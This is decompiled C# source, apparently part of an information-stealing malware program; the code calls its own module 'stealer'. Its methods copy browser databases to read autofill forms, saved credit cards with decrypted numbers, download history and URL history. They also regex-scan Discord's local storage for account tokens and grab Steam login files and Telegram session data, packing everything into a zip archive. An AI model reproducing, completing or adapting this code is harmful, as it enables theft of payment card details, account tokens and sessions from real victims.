									//IL_0003: Incompatible stack heights: 0 vs 1
									);
									for (int i = 0; i < num; i++)
									{
										try
										{
											text = text + "Name: " + factoryTestItem.CalcList(i, 0) + "\r\nValue: " + factoryTestItem.CalcList(i, 1) + "\r\n\r\n";
										}
										catch
										{
										}
										Thread.Sleep(3);
									}
									if (text.Length > 5)
									{
										GetEvent(value, (text3 == "Unknown") ? ("Browsers/Unknowns/Forms [" + text3 + "]#" + "ZJ3v" + ".txt") : ("Browsers/Forms [" + text3 + "]#" + "7hUZ" + ".txt"), Encoding.Default.GetBytes(text));
									}
								}
								catch
								{
								}
								File.Delete(text2);
							}
						}
						catch
						{
						}
						Thread.Sleep(10);
					}
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void CustomizeEvent(ZipArchive param, List<string> cust)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				List<string> list = cust.FindAll((string _0002) => _0002.Contains("Web Data"));
				if (list.Count >= 1)
				{
					foreach (string item in list)
					{
						try
						{
							if (File.Exists(item))
							{
								string text = string.Empty;
								string text2 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "qhNYirl37e";
								File.Copy(item, text2, overwrite: true);
								try
								{
									string text3 = ListEvent(item);
									FactoryTestItem factoryTestItem = new FactoryTestItem(text2);
									factoryTestItem.RestartList("credit_cards");
									int num = factoryTestItem.ReadList();
									for (int i = 0; i < num; i++)
									{
										try
										{
											string empty = string.Empty;
											string text4 = factoryTestItem.CalcList(i, 4);
											empty = ((Encoding.Default.GetBytes(text4)[0] != 118) ? DeleteEvent(text4) : SelectEvent(item, text4));
											text = text + "Name: " + factoryTestItem.CalcList(i, 1) + "\r\nNumber: " + empty + "\r\nExpiration: " + factoryTestItem.CalcList(i, 2) + "/" + factoryTestItem.CalcList(i, 3) + "\r\nBilling: " + factoryTestItem.CalcList(i, 9) + "\r\n\r\n";
										}
										catch
										{
										}
										Thread.Sleep(3);
									}
									if (text.Length > 5)
									{
										GetEvent(param, (text3 == "Unknown") ? ("Browsers/Unknowns/CC [" + text3 + "]#" + "fXzJ" + ".txt") : ("Browsers/CC [" + text3 + "]#" + "cdwl" + ".txt"), Encoding.Default.GetBytes(text));
									}
								}
								catch
								{
								}
								File.Delete(text2);
							}
						}
						catch
						{
						}
						Thread.Sleep(10);
					}
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void QueryEvent(ZipArchive spec, List<string> second)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				List<string> list = second.FindAll((string _0002) => _0002.Contains("History"));
				if (list.Count >= 1)
				{
					foreach (string item in list)
					{
						try
						{
							if (File.Exists(item))
							{
								string text = string.Empty;
								string text2 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "zr6UilfS1f";
								File.Copy(item, text2, overwrite: true);
								try
								{
									string text3 = ListEvent(item);
									FactoryTestItem factoryTestItem = new FactoryTestItem(text2);
									factoryTestItem.RestartList("downloads");
									int num = factoryTestItem.ReadList();
									for (int i = 0; i < num; i++)
									{
										try
										{
											text = text + "Path: " + factoryTestItem.CalcList(i, 3) + "\r\nURL: " + factoryTestItem.CalcList(i, 17) + "\r\n\r\n";
										}
										catch
										{
										}
										Thread.Sleep(3);
									}
									if (text.Length > 5)
									{
										GetEvent(spec, (text3 == "Unknown") ? ("Browsers/Unknowns/Download-History [" + text3 + "]#" + "DzwO" + ".txt") : ("Browsers/Download-History [" + text3 + "]#" + "U1sw" + ".txt"), Encoding.Default.GetBytes(text));
									}
								}
								catch
								{
								}
								File.Delete(text2);
							}
						}
						catch
						{
						}
						try
						{
							if (File.Exists(item))
							{
								string text4 = string.Empty;
								string text5 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "mXlVsKuBVj";
								File.Copy(item, text5, overwrite: true);
								try
								{
									string text6 = ListEvent(item);
									FactoryTestItem factoryTestItem2 = new FactoryTestItem(text5);
									factoryTestItem2.RestartList("urls");
									int num2 = factoryTestItem2.ReadList();
									for (int j = 0; j < num2; j++)
									{
										try
										{
											text4 = text4 + "Title: " + factoryTestItem2.CalcList(j, 2) + "\r\nURL: " + factoryTestItem2.CalcList(j, 1) + "\r\n\r\n";
										}
										catch
										{
										}
										Thread.Sleep(3);
									}
									if (text4.Length > 5)
									{
										GetEvent(spec, (text6 == "Unknown") ? ("Browsers/Unknowns/URL-History [" + text6 + "]#" + "kPTM" + ".txt") : ("Browsers/URL-History [" + text6 + "]#" + "zVB6" + ".txt"), Encoding.Default.GetBytes(text4));
									}
								}
								catch
								{
								}
								File.Delete(text5);
							}
						}
						catch
						{
						}
						Thread.Sleep(10);
					}
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private string CancelEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			List<string> list = new List<string>();
			string text = string.Empty;
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
				if (!Directory.Exists(path))
				{
					return "Discord not installed!";
				}
				string[] files = Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly);
				foreach (string path2 in files)
				{
					string text2 = File.ReadAllText(path2);
					if (text2.Contains("oken"))
					{
						list.Add(text2);
					}
				}
				if (list.Count == 0)
				{
					return "Failed.";
				}
				foreach (string item in list)
				{
					foreach (Match item2 in Regex.Matches(item, "[^\"]*"))
					{
						if (item2.Length == 59 && item2.ToString().Contains('.') && item2.ToString().Split(new string[1]
						{
							"."
						}, StringSplitOptions.None).Count() - 1 >= 2)
						{
							text = text + item2.ToString() + "\r\n";
						}
					}
				}
			}
			catch
			{
			}
			return text;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void ExcludeEvent(ZipArchive param)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				DispatcherInstanceExpression.CancelFilter("stealer", "Fetching Steam...", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
				string text = DatabaseTestItem.ResetEvent();
				if (Directory.Exists(text + "/config"))
				{
					(from _0002 in Directory.GetFiles(text + "/config", "*.vdf")
						where Path.GetFileName(_0002) == "loginusers.vdf" || Path.GetFileName(_0002) == "config.vdf"
						select _0002).ToList().ForEach(delegate(string _0002)
					{
						//Discarded unreachable code: IL_0002
						//IL_0003: Incompatible stack heights: 0 vs 1
						GetEvent(param, "Other/Steam/" + Path.GetFileName(_0002), File.ReadAllBytes(_0002));
					});
					Directory.GetFiles(text, "ssfn*").ToList().ForEach(delegate(string _0002)
					{
						//Discarded unreachable code: IL_0002
						//IL_0003: Incompatible stack heights: 0 vs 1
						GetEvent(param, "Other/Steam/" + Path.GetFileName(_0002), File.ReadAllBytes(_0002));
					});
					GetEvent(param, "Other/Steam#Information.txt", Encoding.Default.GetBytes("Login: " + DatabaseTestItem.CalcEvent() + "\r\nID: " + DatabaseTestItem.InstantiateEvent() + "\r\nPath: " + text + "\r\nLang: " + DatabaseTestItem.ReflectEvent()));
				}
				else
				{
					GetEvent(param, "Other/Steam#Information.txt", Encoding.Default.GetBytes("Steam not installed."));
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void SetupEvent(ZipArchive v)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				DispatcherInstanceExpression.CancelFilter("stealer", "Fetching Telegram...", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
				string text = DatabaseTestItem.InterruptEvent();
				if (Directory.Exists(text + "/tdata"))
				{
					v.CreateEntry("Other/Telegram/tdata/");
					Directory.GetFiles(text + "/tdata", "D*").ToList().ForEach(delegate(string _0002)
					{
						//Discarded unreachable code: IL_0002
						//IL_0003: Incompatible stack heights: 0 vs 1
						GetEvent(v, "Other/Telegram/tdata/" + Path.GetFileName(_0002), File.ReadAllBytes(_0002));
					});
					string path = Directory.GetDirectories(text + "/tdata", "D8*")[0];
					v.CreateEntry("Other/Telegram/tdata/" + Path.GetFileName(path) + "/");
					Directory.GetFiles(path, "*").ToList().ForEach(delegate(string _0002)
					{
						//Discarded unreachable code: IL_0002
						//IL_0003: Incompatible stack heights: 0 vs 1
						GetEvent(v, "Other/Telegram/tdata/" + Path.GetFileName(path) + "/" + Path.GetFileName(_0002), File.ReadAllBytes(_0002));
					});
					GetEvent(v, "Other/Telegram#Information.txt", Encoding.Default.GetBytes("Path: " + text));
				}
				else
				{
					GetEvent(v, "Other/Telegram#Information.txt", Encoding.Default.GetBytes("Telegram not installed."));
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public Context()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			_Param = new List<string>();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		internal static object ManageEvent(IntPtr value)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			object obj = Marshal.PtrToStructure(value, typeof(Publisher.TokenInstanceExpression));
			FieldInfo field = obj.GetType().GetField("Type");
			object value2 = field.GetValue(obj);
			IntPtr ptr = (IntPtr)(value.ToInt64() + 16);
			switch ((int)value2)
			{
			case 7:
			{
				IntPtr ptr2 = Marshal.ReadIntPtr(ptr);
				return Marshal.PtrToStringUni(ptr2);
			}
			case 0:
			{
				object obj2 = Marshal.ReadByte(ptr);
				return (bool)obj2;
			}
			case 1:
				return Marshal.ReadInt16(ptr);
			case 2:
				return Marshal.ReadInt16(ptr);
			case 3:
				return Marshal.ReadInt32(ptr);
			case 4:
				return Marshal.ReadInt32(ptr);
			case 5:
				return Marshal.PtrToStructure(ptr, typeof(double));
			case 6:
				return Marshal.PtrToStructure(ptr, typeof(Guid));
			case 12:
			{
				IntPtr binaryForm = Marshal.ReadIntPtr(ptr);
				SecurityIdentifier securityIdentifier = new SecurityIdentifier(binaryForm);
				return securityIdentifier.Value;
			}
			default:
				return null;
			}
		}
	}
}
